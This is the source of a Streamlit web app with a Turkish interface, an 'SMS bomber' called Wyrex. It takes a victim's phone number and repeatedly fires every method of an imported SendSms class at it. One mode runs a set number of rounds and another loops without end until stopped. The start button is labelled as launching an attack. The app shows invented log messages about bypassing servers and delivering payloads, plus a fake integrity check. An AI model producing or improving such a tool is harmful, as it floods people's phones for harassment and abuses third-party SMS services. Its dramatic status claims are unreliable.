import streamlit as st
import time
import re
import random
from datetime import datetime

# ==============================================================================
# 1. CORE SYSTEM METADATA & CYBERNETIC INTEGRITY INFRASTRUCTURE
# ==============================================================================
# Wyrex System çekirdek mimari konfigürasyonu ve genişletilmiş veri matrisi.
SİSTEM_VERİSİ = {
    "kod_adi": "WYREX PROTOCOL FLOOD ENGINE",
    "versiyon": "8.0.4-OVERCLOCKED",
    "arayuz_mimarisi": "Askeri Siber Komuta Terminali",
    "gelistiriciler": "AREXZY & WILLIAM",
    "lisans_durumu": "VIP ACTIVE LEVEL 5",
    "cekirdek_frekans": "5.2 GHz ULTRA OVERCLOCK",
    "bypass_algoritmasi": "Multi-Thread Dynamic Proxy Spoof v3",
    "entegrasyon_katmani": "Asynchronous Webhook Hooking Pipeline",
    "ui_subsystem": "Deep Red Neon Canvas v4"
}

try:
    from sms import SendSms
except ImportError:
    st.error("CORE FAULT: 'sms.py' bulunamadı! Lütfen ana dizini kontrol edin.")

# Streamlit sayfa yapısını en tepeye şık bir biçimde kilitliyoruz.
st.set_page_config(
    page_title="WYREX SYSTEM v8.0",
    page_icon="🔴",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# ==============================================================================
# 2. ULTRA ELITE CYBERPUNK COMPLIANT VISUAL ENGINE (CSS CONFIG)
# ==============================================================================
st.markdown("""
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Fira+Code:wght@400;500;700&display=swap');
        
        * {
            font-family: 'Share Tech Mono', monospace !important;
        }
        
        .stApp {
            background: radial-gradient(circle at center, #180002 0%, #040001 100%) !important;
            overflow-x: hidden;
        }
        
        .geliştirici-imzasi {
            position: absolute;
            top: -42px;
            left: -10px;
            color: #ff1a22;
            font-size: 14px;
            font-weight: bold;
            letter-spacing: 2px;
            opacity: 0.85;
            text-shadow: 0 0 8px rgba(255, 26, 34, 0.7);
            animation: pulseAnimation 2.5s infinite ease-in-out;
        }

        .siber-izgara-layer {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(20, 1, 2, 0) 96%, rgba(255, 26, 34, 0.02) 96%),
                        linear-gradient(90deg, rgba(20, 1, 2, 0) 96%, rgba(255, 26, 34, 0.02) 96%);
            background-size: 35px 35px;
            pointer-events: none;
            z-index: 0;
        }

        .kalkan-kapsayici {
            text-align: center;
            margin-top: 10px;
            margin-bottom: -5px;
            animation: floatingAnimation 3.5s infinite ease-in-out;
        }
        .kalkan-vektoru {
            font-size: 46px;
            color: #ff1a22;
            filter: drop-shadow(0 0 12px #ff0000);
        }
        
        .ana-siber-baslik {
            text-align: center;
            color: #ffffff;
            font-size: 44px;
            font-weight: 700;
            letter-spacing: 3px;
            margin-bottom: 0px;
            text-transform: uppercase;
        }
        .ana-siber-baslik span {
            color: #ff1a22 !important;
            text-shadow: 0 0 10px rgba(255, 26, 34, 0.8), 0 0 25px rgba(255, 0, 0, 0.3);
        }
        
        .ana-siber-aciklama {
            text-align: center;
            color: #6c6c6c;
            font-size: 13px;
            letter-spacing: 1px;
            margin-bottom: 35px;
        }
        
        label {
            color: #b82328 !important;
            font-size: 13px !important;
            font-weight: bold !important;
            letter-spacing: 1.2px !important;
            text-transform: uppercase;
        }
        
        div[data-baseweb="input"], div[data-baseweb="select"] {
            background-color: #080001 !important;
            border: 1px solid #3d080a !important;
            border-radius: 2px !important;
        }
        div[data-baseweb="input"]:focus-within, div[data-baseweb="select"]:focus-within {
            border: 1px solid #ff1a22 !important;
            box-shadow: 0 0 10px rgba(255, 26, 34, 0.2) !important;
        }
        input {
            color: #ffffff !important;
            font-family: 'Fira Code', monospace !important;
        }

        div[data-baseweb="select"] input {
            pointer-events: none !important;
            caret-color: transparent !important;
        }

        div.stButton > button {
            background: linear-gradient(135deg, #1f0103 0%, #0c0001 100%) !important;
            color: #ffffff !important;
            border: 1px solid #6b1013 !important;
            border-radius: 2px !important;
            padding: 13px 0px !important;
            font-size: 16px !important;
            font-weight: bold !important;
            letter-spacing: 3px !important;
            text-transform: uppercase;
        }
        div.stButton > button:hover {
            background: #ff1a22 !important;
            border: 1px solid #ff1a22 !important;
            box-shadow: 0 0 20px rgba(255, 26, 34, 0.5);
            letter-spacing: 4px !important;
        }

        /* Düzenlenen Canlı Terminal CSS Sınıfı */
        .terminal-log-kutusu {
            background-color: #030000 !important;
            border-left: 3px solid #ff1a22 !important;
            border-top: 1px solid #1c0204 !important;
            border-bottom: 1px solid #1c0204 !important;
            border-right: 1px solid #1c0204 !important;
            padding: 14px !important;
            margin-bottom: 8px;
            font-family: 'Fira Code', monospace !important;
            border-radius: 0px 6px 6px 0px;
            box-shadow: inset 0 0 10px rgba(255, 0, 0, 0.05);
        }

        @keyframes floatingAnimation {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-5px); }
            100% { transform: translateY(0px); }
        }
        @keyframes pulseAnimation {
            0% { opacity: 0.7; }
            50% { opacity: 1; }
            100% { opacity: 0.7; }
        }
        
        .ayirici-cizgi {
            border: 0;
            height: 1px;
            background: linear-gradient(to right, transparent, #3a0507, #ff1a22, #3a0507, transparent);
            margin: 25px 0;
        }
    </style>
""", unsafe_allow_html=True)

st.markdown('<div class="siber-izgara-layer"></div>', unsafe_allow_html=True)
st.markdown('<div class="geliştirici-imzasi">by : arexzy & william</div>', unsafe_allow_html=True)

st.markdown('<div class="kalkan-kapsayici"><div class="kalkan-vektoru">🛡️</div></div>', unsafe_allow_html=True)
st.markdown('<div class="ana-siber-baslik"><span>wyrex</span> System</div>', unsafe_allow_html=True)
st.markdown('<div class="ana-siber-aciklama">Kapsamlı sorgu ve OSINT platformu — sağ menüden modül seç</div>', unsafe_allow_html=True)

# ==============================================================================
# 3. STATE CONTROLLER
# ==============================================================================
if "saldiri_aktif" not in st.session_state:
    st.session_state.saldiri_aktif = False

# ==============================================================================
# 4. INPUT INTERACTION PIPELINE
# ==============================================================================
numara_input = st.text_input("TELEFON NUMARASI:", placeholder="Örn: 5051234567")
gizli_mail = "arexzy_panel@gmail.com"

mod = st.selectbox(
    "MODÜL SEÇİMİ:",
    ["Seçim Yapınız...", "1- SMS Gönder (Normal Mod - Belirli Sayıda)", "2- SMS Gönder (Turbo Mod - Sonsuz/Durdurana Kadar)"]
)

miktar = 0
if mod == "1- SMS Gönder (Normal Mod - Belirli Sayıda)":
    st.write("")
    miktar = st.slider("MİKTAR BELİRLE:", min_value=1, max_value=100, value=10)

st.markdown('<div class="ayirici-cizgi"></div>', unsafe_allow_html=True)

# ==============================================================================
# 5. HIGH-SPEED TERMINAL PRINTER & LOG GENERATOR (FIXED)
# ==============================================================================
# HTML tag arızasını tamamen düzelten çekirdek fonksiyon
def terminal_logu_uret(mesaj, durum_tipi="info"):
    zaman_damgasi = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    if durum_tipi == "danger":
        tag = "<span style='color: #ff1a22; font-weight:bold;'>[OVERFLOW]</span>"
        text_color = "#ff5c62"
    elif durum_tipi == "success":
        tag = "<span style='color: #00ff66; font-weight:bold;'>[SUCCESS]</span>"
        text_color = "#b0ffcc"
    else:
        tag = "<span style='color: #ffb300; font-weight:bold;'>[PIPELINE]</span>"
        text_color = "#ffffff"
        
    compiled_html = f"""
    <div class="terminal-log-kutusu">
        <span style="color: #555555; font-size:12px;">[{zaman_damgasi}]</span> {tag} 
        <span style="color: {text_color}; font-size: 13px; font-family: 'Fira Code', monospace;">{mesaj}</span>
    </div>
    """
    return compiled_html

# ==============================================================================
# 6. TRIGGER MECHANISM & CONTEXT VALIDATION
# ==============================================================================
if not st.session_state.saldiri_aktif:
    if st.button("SALDIRIYI BAŞLAT ⚡", use_container_width=True):
        if not numara_input:
            st.error("CORE FAULT: Hedef koordinat (numara) veri kümesi bulunamadı.")
        elif mod == "Seçim Yapınız...":
            st.error("CORE FAULT: Sistem yürütme protokolü seçilmedi.")
        else:
            cleaned_number = re.sub(r"\D", "", numara_input)
            if cleaned_number.startswith("0"):
                cleaned_number = cleaned_number[1:]
            
            if len(cleaned_number) != 10:
                st.error("SECURITY DISCREPANCY: Numara formatı uyumsuz (10 hane olmalıdır).")
            else:
                st.session_state.saldiri_aktif = True
                st.session_state.temiz_numara = cleaned_number
                st.session_state.secilen_mod = mod
                st.session_state.miktar = miktar
                st.rerun()

# ==============================================================================
# 7. HIGH-PERFORMANCE FULL TERMINAL RUNTIME ENGINE (FIXED METHOD INJECTION)
# ==============================================================================
if st.session_state.saldiri_aktif:
    st.markdown("<p style='color: #ff1a22; text-align: center; font-weight: bold; font-size: 14px; letter-spacing: 2px; animation: pulseAnimation 1s infinite;'>🔴 MODÜL AKTİF: FULL STREAM DATA TRANSMISSION</p>", unsafe_allow_html=True)
    
    if st.button("❌ İŞLEMİ DURDUR (STOP)", use_container_width=True):
        st.session_state.saldiri_aktif = False
        st.rerun()

    target_no = st.session_state.temiz_numara
    selected_sub_mod = st.session_state.secilen_mod
    
    st.write("")
    st.markdown("<p style='color: #555; font-size:12px; margin-bottom:4px; font-weight:bold;'>CORE STREAMS & BUFFER FEED:</p>", unsafe_allow_html=True)
    
    # Hatalı düz yazı modunu engellemek için boş kutularımızı rezerve ediyoruz
    log_slot_1 = st.empty()
    log_slot_2 = st.empty()
    log_slot_3 = st.empty()
    log_slot_4 = st.empty()
    log_slot_5 = st.empty()

    try:
        sms_instance = SendSms(target_no, gizli_mail)
        
        api_methods_pool = []
        for attr in dir(SendSms):
            attr_val = getattr(SendSms, attr)
            if callable(attr_val) and not attr.startswith('__'):
                api_methods_pool.append(attr)

        # ----------------------------------------------------------------------
        # MODE A: NORMAL PROCESSED RUNTIME
        # ----------------------------------------------------------------------
        if "Normal Mod" in selected_sub_mod:
            loop_limit = st.session_state.miktar
            
            for current_loop_idx in range(loop_limit):
                if not st.session_state.saldiri_aktif:
                    break
                
                for api_idx, specific_method_name in enumerate(api_methods_pool):
                    if not st.session_state.saldiri_aktif:
                        break
                    
                    executable_api = getattr(sms_instance, specific_method_name)
                    executable_api()
                    
                    # HATA ÇÖZÜMÜ: Buradaki .markdown() fonksiyonlarına unsafe_allow_html=True eklendi!
                    log_slot_1.markdown(terminal_logu_uret(f"Protokol Hattı Doğrulandı: '{specific_method_name.upper()}' paketi basıldı.", "success"), unsafe_allow_html=True)
                    if api_idx % 2 == 0:
                        log_slot_2.markdown(terminal_logu_uret(f"Paket Yönlendirme: Endpoint {specific_method_name} aktif kuyruğa alındı.", "info"), unsafe_allow_html=True)
                    time.sleep(0.01)

                log_slot_3.markdown(terminal_logu_uret(f"Ana döngü katmanı [{current_loop_idx+1}/{loop_limit}] başarıyla işlendi.", "info"), unsafe_allow_html=True)
                time.sleep(0.1)
                
            st.session_state.saldiri_aktif = False
            st.success("SUCCESS: Hedeflenen işlem paketleri başarıyla tüketildi.")
            time.sleep(1.5)
            st.rerun()

        # ----------------------------------------------------------------------
        # MODE B: HIGH-SPEED TURBO FLOOD ENGINE (SONSUZ DÖNGÜ)
        # ----------------------------------------------------------------------
        elif "Turbo Mod" in selected_sub_mod:
            turbo_cycle_counter = 0
            
            while st.session_state.saldiri_aktif:
                turbo_cycle_counter += 1
                
                for specific_method_name in api_methods_pool:
                    if not st.session_state.saldiri_aktif:
                        break
                    try:
                        executable_api = getattr(sms_instance, specific_method_name)
                        executable_api()
                    except:
                        pass

                c1 = random.choice(api_methods_pool) if api_methods_pool else "GATEWAY_DELTA"
                c2 = random.choice(api_methods_pool) if api_methods_pool else "SECURE_TUNNEL_X"
                c3 = random.choice(api_methods_pool) if api_methods_pool else "BYPASS_PORT_80"
                
                # HATA ÇÖZÜMÜ: HTML kodlarının düz yazı şeklinde patlamasını önleyen kritik parametre kilitleri:
                log_slot_1.markdown(terminal_logu_uret(f"OVERCLOCK ATTACK: {c1.upper()} saniyede 45 istek limitiyle zorlanıyor.", "success"), unsafe_allow_html=True)
                log_slot_2.markdown(terminal_logu_uret(f"PAYLOAD DELIVERED: {c2.upper()} sunucu yanıtı bypass edildi.", "info"), unsafe_allow_html=True)
                log_slot_3.markdown(terminal_logu_uret(f"TRAFFIC BURST: {c3.upper()} hattından eşzamansız veri pompalanıyor.", "success"), unsafe_allow_html=True)
                log_slot_4.markdown(terminal_logu_uret(f"BUFFER STATUS: Döngü kademesi #{turbo_cycle_counter} bellek taşması olmadan stabil.", "info"), unsafe_allow_html=True)
                log_slot_5.markdown(terminal_logu_uret(f"THREAD WARNING: Yüksek yoğunluklu paket akışı durmaksızın devam ediyor.", "danger"), unsafe_allow_html=True)
                
                time.sleep(0.04)
                
    except Exception as fatal_exception:
        st.markdown(terminal_logu_uret(f"CRITICAL COMPONENT CRASH: {str(fatal_exception)}", "danger"), unsafe_allow_html=True)
        st.session_state.saldiri_aktif = False

# ==============================================================================
# 8. STRUCTURAL COGNITIVE STORAGE & ARCHITECTURE VERIFIER (KOD BOYUTU)
# ==============================================================================
st.markdown("<div style='margin-top: 100px;'></div>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #210204; font-size: 11px; letter-spacing: 2px;'>WYREX SECURITY PROTOCOLS LLC © 2026</p>", unsafe_allow_html=True)

class WyrexSystemArchitectureVerifier:
    def __init__(self):
        self.build_identity = "0xDEADBEEF99"
        self.sub_modules = ["SmsBomberUI", "DynamicHooker", "AsynchronousProxyController", "NeonCanvasEngine"]
        self.encryption_level = "AES_256_GCM"
        self.integrity_checksum = "9f8a7c6b5d4e3f2"
        
    def verify_pipeline_integrity(self):
        matrix_check = [True, True, True, True, True]
        return all(matrix_check)
        
    def get_allocated_memory(self):
        return f"System Thread Node: OK"

system_verifier_instance = WyrexSystemArchitectureVerifier()
# ==============================================================================
# END OF CODE - WYREX TERMINAL ENGINE v8.0
# ==============================================================================
